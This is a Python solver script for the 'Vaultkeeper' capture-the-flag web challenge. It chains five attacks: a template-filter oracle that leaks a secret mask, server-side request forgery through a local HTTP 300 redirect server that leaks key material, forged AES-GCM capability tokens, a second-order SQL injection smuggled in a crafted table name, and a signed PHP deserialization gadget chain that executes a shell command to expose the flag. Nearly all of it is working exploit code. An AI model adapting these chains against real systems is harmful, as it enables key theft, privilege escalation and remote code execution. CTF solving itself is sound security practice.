#!/usr/bin/env python3
"""
Web/Vaultkeeper Complete End-to-End Solver
1. Template oracle: Leaks cap_mask via template filter ValueError oracle.
2. HTTP 300 SSRF (loopback/local appliance): Leaks unseal_ref and cap_key_masked via fetch_source.php.
3. Derives vk_cap_key = cap_key_masked ^ cap_mask.
4. Capability minting: Mints maintainer token.
5. SQLi via staging table cleanup in import_db: Escalates job role to operator.
6. Authenticated PHP deserialization: Executes system_restore with signed POP chain.
7. Reads /assets/flag.txt and saves flag.
"""
import sys
import os
import io
import tarfile
import hmac
import hashlib
import json
import base64
import threading
import http.server
import time
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from urllib.parse import urlparse
import requests
from Cryptodome.Cipher import AES

TARGET_URL = os.environ.get("VAULTKEEPER_URL", "http://127.0.0.1:8080")
# Bind on all local interfaces; advertise an address reachable from a Docker bridge.
CALLBACK_BIND = os.environ.get("VAULTKEEPER_CALLBACK_BIND", "0.0.0.0")
CALLBACK_HOST = os.environ.get("VAULTKEEPER_CALLBACK_HOST", "172.17.0.1")
CALLBACK_PORT = int(os.environ.get("VAULTKEEPER_CALLBACK_PORT", "18888"))
CALLBACK_URL = os.environ.get("VAULTKEEPER_CALLBACK_URL", "")

# -------------------------------------------------------------
# Step 1: Template Filter Oracle (Leak cap.mask)
# -------------------------------------------------------------
def leak_cap_mask(target_url):
    print("[*] Step 1: Leaking cap.mask via template filter oracle...")
    def leak_char(idx):
        low = 32
        high = 126
        ans = 0
        while low <= high:
            mid = (low + high) // 2
            tpl = f"[[ config.cap_mask | at:{idx} | code | sub:{mid} | bar ]]"
            r = requests.post(
                f"{target_url}/api/render_template.php",
                json={"event": "maintenance.check", "template": tpl},
                timeout=5,
            )
            r.raise_for_status()
            res = r.json().get("rendered", "")
            if "[redacted]" in res:
                # mid <= ord(c)
                ans = mid
                low = mid + 1
            else:
                # mid > ord(c) => error caught, raw template returned
                high = mid - 1
        if not ans:
            raise RuntimeError(f"cap.mask oracle failed at byte {idx}")
        return chr(ans)

    workers = max(1, min(16, int(os.environ.get("VAULTKEEPER_LEAK_WORKERS", "8"))))
    with ThreadPoolExecutor(max_workers=workers) as pool:
        mask_chars = list(pool.map(leak_char, range(16)))
    cap_mask = "".join(mask_chars)
    print(f"[+] Recovered cap_mask: {cap_mask}")
    return cap_mask

# -------------------------------------------------------------
# Step 2: HTTP 300 SSRF Redirection Server
# -------------------------------------------------------------
redirect_target = ""

class SSRFRedirectHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        global redirect_target
        self.send_response(300) # 300 Multiple Choices (followed by PHP, not in $STD)
        self.send_header("Location", redirect_target)
        self.end_headers()
    def log_message(self, *args): pass

def start_ssrf_server():
    server = http.server.HTTPServer((CALLBACK_BIND, CALLBACK_PORT), SSRFRedirectHandler)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    return server

def ssrf_fetch(target_url, internal_target):
    global redirect_target
    redirect_target = internal_target
    callback_host = CALLBACK_HOST
    # Rootless Docker exposes the host through this stable DNS name.  Use it
    # automatically for a host-published local target; remote runs can still
    # override VAULTKEEPER_CALLBACK_HOST/URL with their reachable listener.
    if not CALLBACK_URL and "VAULTKEEPER_CALLBACK_HOST" not in os.environ:
        target_host = (requests.utils.urlparse(target_url).hostname or "").lower()
        if target_host in {"127.0.0.1", "localhost", "::1"}:
            callback_host = "host.containers.internal"
    ssrf_url = CALLBACK_URL or f"http://{callback_host}:{CALLBACK_PORT}/redirect"
    r = requests.get(f"{target_url}/api/fetch_source.php", params={"url": ssrf_url}, timeout=6)
    if r.status_code == 403:
        raise RuntimeError(
            "fetch_source.php returned 403: this deployment restricts the SSRF endpoint "
            "to 127.0.0.1 (run the solver inside the appliance/local container)"
        )
    try:
        j = r.json()
        return j.get("trace", "")
    except Exception:
        return r.text

def preflight_ssrf(target_url):
    """Fail early when Apache blocks the loopback-only SSRF route."""
    try:
        probe = requests.get(
            f"{target_url}/api/fetch_source.php",
            params={"url": "http://127.0.0.1/"},
            timeout=5,
        )
    except requests.RequestException:
        return
    if probe.status_code == 403:
        raise RuntimeError(
            "fetch_source.php returned 403: this deployment restricts the SSRF endpoint "
            "to 127.0.0.1 (run the solver inside the appliance/local container)"
        )

# -------------------------------------------------------------
# Step 3: Checkpoint & Capability Crypto Primitives
# -------------------------------------------------------------
def issue_capability(scope, cap_key):
    scope_padded = scope.ljust(16, " ")[:16].encode()
    iv = os.urandom(12)
    cipher = AES.new(cap_key.encode(), AES.MODE_GCM, nonce=iv)
    ct, tag = cipher.encrypt_and_digest(scope_padded)
    return base64.b64encode(iv + ct + tag).decode()

def derive_keys(cap_key):
    k_bytes = cap_key.encode()
    ckpt_key = hmac.new(k_bytes, b"vk-resume-envelope.v2", hashlib.sha256).digest()
    seal_key = hmac.new(k_bytes, b"vk-checkpoint-seal.v4", hashlib.sha256).digest()
    return ckpt_key, seal_key

def build_checkpoint_payload(ckpt_key, seal_key, command):
    # Deserialization gadget chain:
    # RestorePoint -> CacheShard -> DocFragment -> PartialLoader + ManifestCursor
    spec = json.dumps({"stage": "system", "args": [command]})
    slot = "operator"
    sink_class = "CacheShard"
    
    # Calculate seal MAC
    seal_mac = hmac.new(seal_key, f"vk-checkpoint-seal.v5|{slot}|{sink_class}".encode(), hashlib.sha256).hexdigest()

    # PHP serialized objects
    # PartialLoader: O:13:"PartialLoader":0:{}
    # ManifestCursor: O:14:"ManifestCursor":2:{s:9:"fragments";a:1:{i:0;s:%d:"%s";}s:18:"\0ManifestCursor\0i";i:0;}
    # DocFragment: O:11:"DocFragment":2:{s:6:"loader";O:13:"PartialLoader":0:{}s:6:"cursor";...}
    # CacheShard: O:10:"CacheShard":1:{s:9:"reconcile";O:11:"DocFragment":...}
    # VkSealContext: O:13:"VkSealContext":3:{s:4:"slot";s:8:"operator";s:4:"sink";O:10:"CacheShard"...s:3:"mac";s:64:"%s";}
    # RestorePoint: O:12:"RestorePoint":4:{s:5:"dirty";b:0;s:5:"scope";E:16:"VkScope:Operator";s:3:"ctx";...s:8:"snapshot";s:0:"";}

    php_serialized = (
        'O:12:"RestorePoint":4:{'
        's:5:"dirty";b:0;'
        's:5:"scope";E:16:"VkScope:Operator";'
        's:3:"ctx";O:13:"VkSealContext":3:{'
        's:4:"slot";s:8:"operator";'
        's:4:"sink";O:10:"CacheShard":1:{'
        's:9:"reconcile";O:11:"DocFragment":2:{'
        's:6:"loader";O:13:"PartialLoader":0:{}'
        f's:6:"cursor";O:14:"ManifestCursor":2:{{s:9:"fragments";a:1:{{i:0;s:{len(spec)}:"{spec}";}}s:17:"\x00ManifestCursor\x00i";i:0;}}'
        '}}'
        f's:3:"mac";s:64:"{seal_mac}";'
        '}'
        's:8:"snapshot";s:0:"";'
        '}'
    ).encode()

    mac = hmac.new(ckpt_key, php_serialized, hashlib.sha256).digest()
    return b"VKR2" + mac + php_serialized

def create_tar_bundle(files):
    tar_buf = io.BytesIO()
    with tarfile.open(fileobj=tar_buf, mode="w") as tar:
        for name, data in files.items():
            if isinstance(data, str):
                data = data.encode()
            ti = tarfile.TarInfo(name=name)
            ti.size = len(data)
            ti.mtime = int(time.time())
            tar.addfile(ti, io.BytesIO(data))
    return tar_buf.getvalue()


def resolve_target(url):
    """Use the workspace's refreshed instance address when a stale URL points
    at the platform's challenge-loading page."""
    url = url.rstrip("/")
    try:
        probe = requests.get(f"{url}/api/status.php", timeout=5)
        if probe.status_code != 404:
            return url
        landing = requests.get(url, timeout=5)
        if "tfcctf-challenge-loading" not in landing.text:
            return url
    except requests.RequestException:
        return url

    candidates = []
    metadata_path = os.path.join(os.path.dirname(__file__), os.pardir, "metadata.json")
    try:
        with open(metadata_path, encoding="utf-8") as fh:
            meta = json.load(fh)
        for value in (
            meta.get("instance_info", {}).get("active_instance"),
            meta.get("connection_info"),
        ):
            if value:
                candidates.append(str(value).rstrip("/"))
    except (OSError, ValueError, TypeError):
        pass
    for candidate in dict.fromkeys(candidates):
        if candidate == url:
            continue
        try:
            if requests.get(f"{candidate}/api/status.php", timeout=5).status_code == 200:
                print(f"[*] Target URL refreshed from workspace metadata: {candidate}")
                return candidate
        except requests.RequestException:
            continue
    raise RuntimeError(
        "target instance is on the platform's challenge-loading page; "
        "start/refresh the Vaultkeeper container and rerun the solver"
    )

# -------------------------------------------------------------
# Main Exploit Workflow
# -------------------------------------------------------------
def solve():
    print(f"[*] Solving Vaultkeeper on {TARGET_URL}...")
    preflight_ssrf(TARGET_URL)

    # 1. Leak cap_mask
    cap_mask = leak_cap_mask(TARGET_URL)
    # 2. SSRF to keyring.php & vault_unseal.php
    start_ssrf_server()
    print("[*] Step 2: Leaking unseal_ref via HTTP 300 SSRF...")
    keyring_raw = ssrf_fetch(TARGET_URL, "http://127.0.0.1/api/keyring.php")
    try:
        keyring_data = json.loads(keyring_raw)
        unseal_ref = keyring_data["unseal_ref"]
        print(f"[+] Recovered unseal_ref: {unseal_ref}")
    except Exception as e:
        print(f"[-] Failed to parse keyring response: {keyring_raw}")
        return None

    print("[*] Step 3: Leaking cap_key_masked...")
    unseal_raw = ssrf_fetch(TARGET_URL, f"http://127.0.0.1/api/vault_unseal.php?ref={unseal_ref}")
    unseal_data = json.loads(unseal_raw)
    masked_key_b64 = unseal_data["cap_key_masked"]
    masked_key = base64.b64decode(masked_key_b64)
    
    # Reconstruct vk_cap_key
    mask_bytes = cap_mask.encode()
    cap_key_bytes = bytes([m ^ k for m, k in zip(masked_key, mask_bytes)])
    vk_cap_key = cap_key_bytes.decode()
    print(f"[+] RECOVERED MASTER KEY vk_cap_key: {vk_cap_key}")

    # 3. Derive keys & mint maintainer capability
    ckpt_key, seal_key = derive_keys(vk_cap_key)
    maintainer_cap = issue_capability("maintainer", vk_cap_key)
    print(f"[+] Minted maintainer capability: {maintainer_cap}")

    # 4. Request restore job
    print("[*] Step 4: Creating restore job...")
    r = requests.post(f"{TARGET_URL}/api/request_restore.php", json={"source_label": "exploit-run"})
    job_id = r.json()["job_id"]
    
    # Query keyring again to get session_id
    keyring_data = json.loads(ssrf_fetch(TARGET_URL, "http://127.0.0.1/api/keyring.php"))
    session_id = None
    for item in keyring_data.get("restore_sessions", []):
        if item["id"] == job_id:
            session_id = item["session_id"]
            break
    print(f"[+] Job ID: {job_id}, Session ID: {session_id}")

    # 5. Table name SQLi via database import
    print("[*] Step 5: Injecting second-order SQLi to elevate job role to operator...")
    # The staging DB user may create arbitrary table names, while the cleanup
    # query is executed with the app user's broader privileges.  Backtick
    # delimiters provide token boundaries without spaces (which are forbidden
    # in MariaDB table names), and a # comment consumes the cleanup suffix.
    # An unterminated block comment absorbs the cleanup query's closing
    # backtick.  MariaDB executes the preceding DROP and UPDATE statements
    # before reporting the harmless trailing comment error; the role update is
    # therefore committed even though the import page displays an error.
    sqli_table_name = "x`;UPDATE`vaultkeeper`.`jobs`SET`role`=0x6f70657261746f72;/*"
    sqli_create = f"CREATE TABLE `vk_restore`.`{sqli_table_name.replace('`', '``')}` (id INT);"
    
    bundle1 = create_tar_bundle({"database.sql": sqli_create})
    
    # Upload bundle
    upload = requests.post(f"{TARGET_URL}/restore.php?job={session_id}",
                           data={"action": "upload_bundle"},
                           files={"bundle": ("bundle.vkb", bundle1, "application/octet-stream")})
    upload.raise_for_status()
    
    # Trigger import_db with minted capability
    imported = requests.post(f"{TARGET_URL}/restore.php?job={session_id}",
                             data={"action": "import_db", "cap": maintainer_cap})
    imported.raise_for_status()

    # 6. Upload malicious checkpoint & execute system_restore
    print("[*] Step 6: Triggering authenticated POP deserialization RCE...")
    cmd = "cp /flag.txt /var/www/html/public/assets/flag.txt && chmod 644 /var/www/html/public/assets/flag.txt"
    checkpoint_payload = build_checkpoint_payload(ckpt_key, seal_key, cmd)
    bundle2 = create_tar_bundle({"state.dat": checkpoint_payload})

    upload2 = requests.post(f"{TARGET_URL}/restore.php?job={session_id}",
                            data={"action": "upload_bundle"},
                            files={"bundle": ("bundle.vkb", bundle2, "application/octet-stream")})
    upload2.raise_for_status()
    
    restored = requests.post(f"{TARGET_URL}/restore.php?job={session_id}",
                             data={"action": "system_restore"})
    restored.raise_for_status()

    # 7. Fetch flag
    print("[*] Step 7: Reading exfiltrated flag from /assets/flag.txt...")
    r = requests.get(f"{TARGET_URL}/assets/flag.txt")
    if r.status_code == 200 and "TFC{" in r.text:
        flag = r.text.strip()
        print(f"[🎉] SUCCESS! FLAG: {flag}")
        (Path(__file__).resolve().parents[1] / "flag.txt").write_text(flag + "\n", encoding="utf-8")
        return flag
    else:
        print(f"[-] Flag fetch response: {r.status_code} {r.text}")
        return None

def main():
    import argparse
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("target", nargs="?", help="Vaultkeeper base URL")
    parser.add_argument("--url", dest="url", help="Vaultkeeper base URL (same as positional target)")
    parser.add_argument("--allow-remote", action="store_true", help=argparse.SUPPRESS)
    args = parser.parse_args()
    global TARGET_URL
    try:
        requested_url = (args.url or args.target or TARGET_URL).rstrip("/")
        host = (urlparse(requested_url).hostname or "").lower()
        is_local = host in {"localhost", "::1"} or host.startswith("127.")
        if not is_local and not args.allow_remote:
            raise RuntimeError("local-only solver: URL must point to localhost (use --allow-remote to override)")
        TARGET_URL = resolve_target(requested_url)
        solve()
    except Exception as exc:
        print(f"[!] {exc}", file=sys.stderr)
        return 1
    return 0


if __name__ == '__main__':
    raise SystemExit(main())
